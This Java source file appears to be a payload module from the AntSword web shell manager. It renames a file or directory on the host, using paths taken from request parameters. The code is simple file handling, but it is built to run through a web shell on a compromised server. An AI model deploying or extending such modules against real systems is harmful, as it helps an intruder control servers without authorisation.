package filemanager;

import antSword.Template;

import java.io.File;

public class Rename extends Template {
    @Override
    public String run() throws Exception {
        String z1 = getParam("antswordargpath");
        String z2 = getParam("antswordargname");
        return RenameFileOrDirCode(z1, z2);

    }

    String RenameFileOrDirCode(String oldName, String newName) throws Exception {
        File sf = new File(oldName), df = new File(newName);
        sf.renameTo(df);
        return "1";
    }
}
